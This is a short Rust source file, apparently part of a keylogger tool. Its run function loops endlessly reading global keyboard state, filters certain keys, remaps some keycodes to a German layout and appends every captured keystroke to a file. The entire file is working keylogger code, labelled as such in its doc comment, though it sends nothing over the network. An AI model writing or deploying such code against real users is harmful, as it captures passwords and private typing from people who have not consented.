use device_query::{DeviceQuery, DeviceState};
use std::fs::OpenOptions;
use std::io::Write;

use crate::constants::FILTER_KEYS;

/// Keylogger launch function
pub fn run(path: String) {
    let device_state = DeviceState::new();

    let mut prev_keys = vec![];

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .expect("Failed to open file");

    let filter_keys: Vec<String> = FILTER_KEYS.iter().map(|v| v.to_string()).collect();

    loop {
        let keys = device_state.get_keys();
        if keys != prev_keys && !keys.is_empty() {
            // Filter out unwanted single keys
            if keys.len() == 1 {
                if filter_keys.contains(&format!("{:?}", keys[0])) {
                    continue;
                }

                let s = format!("{:?}", keys[0]);

                println!("{}", s);

                // remap to german
                let s: &str = match keys[0] {
                    device_query::Keycode::Minus => "ß",
                    device_query::Keycode::Equal => "´",
                    device_query::Keycode::RightBracket => "+",
                    device_query::Keycode::BackSlash => "#",
                    device_query::Keycode::Comma => ",",
                    device_query::Keycode::Dot => ".",
                    device_query::Keycode::Slash => "-",
                    _ => &s,
                };
                println!("remapped {}", s);

                write!(file, "{}", s).expect("Failed to write to file");
            } else {
                // TODO: Handle multi key info
            }
        }
        prev_keys = keys;
    }
}
